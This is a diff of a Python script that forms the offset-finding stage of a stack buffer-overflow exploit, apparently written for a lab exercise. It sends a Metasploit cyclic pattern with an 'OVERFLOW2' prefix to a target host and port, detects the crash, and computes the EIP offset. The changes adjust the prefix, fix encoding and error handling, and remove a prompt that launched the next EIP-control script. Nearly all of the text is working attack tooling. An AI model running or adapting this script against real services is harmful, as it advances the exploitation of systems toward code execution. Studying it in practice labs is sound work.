@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import sys
 import subprocess
 import socket
 import argparse
@@ -19,10 +20,10 @@ def main(ip: str, port: int, overflow_threshold: int) -> None:
 	pattern_offset = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb'  # CHANGE IF NECESSARY
 
 	# Define prefix and buffer with encoded cyclic pattern
-	prefix = b"OVERFLOW1 "	
+	prefix = b"OVERFLOW2 "	
 	# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <size>															# CHANGE IF NECESSARY
 	cyclic_pattern = subprocess.check_output([pattern_create, '-l', overflow_threshold])
-	buffer = cyclic_pattern.encode()
+	buffer = cyclic_pattern.decode('utf-8').rstrip('\n').encode('utf-8')
 	payload = b""
 
 	timeout = 5
@@ -36,8 +37,11 @@ def main(ip: str, port: int, overflow_threshold: int) -> None:
 			s.settimeout(timeout)
 
 			# Print server banner
-			response = s.recv(4096)
-			print(f"Banner: {response.decode()}")
+			try:
+				response = s.recv(4096)
+				print(f"{response.decode()}")
+			except:
+				pass
 
 			# Send data to the server
 			payload = b"".join(
@@ -52,32 +56,20 @@ def main(ip: str, port: int, overflow_threshold: int) -> None:
 			response = s.recv(4096)
 			# Print the response from the server
 			print(f"Response: {response.decode()}")
-	
+
+	except ConnectionError:
+		print('Connection Refused')
+		sys.exit(0)
 	except:
 		print("\n","="*25,"CRASH","="*25,"\n")
 		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
 		while True:
-			eip = input("What is the value of the EIP? (ex:FFFFFFFF)")
+			eip = input("What is the value of the EIP? (ex:FFFFFFFF)\n> ")
 			if is_valid_memory_address(eip):
 				# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -1 <value>
 				offset = subprocess.check_output([pattern_offset, '-q', eip])
-				print(offset)
-				while True:
-					answer = input("Do you want to continue and check if you have control over the eip? (y/n): ")
-					if answer.lower() == "y":
-						print("Starting the EIP Control script with:")
-						print(f"\tIP: {ip}")
-						print(f"\tPort: {port}")
-						print(f"\tEIP Offset: {offset}")
-						print(f"\tOverflow Threshold: {overflow_threshold}")
-						subprocess.run(['python', './003_control_eip.py', ip, port, offset, overflow_threshold])
-						break
-					elif answer.lower() == "n":
-						print("Exiting...")
-						break
-					else:
-						print("Invalid input, please enter 'y' or 'n'.")
-						break
+				print(offset.decode('utf-8'))
+				break
 			else:
 				print("Invalid input, please enter a valid memory address.")
 		sys.exit(0)
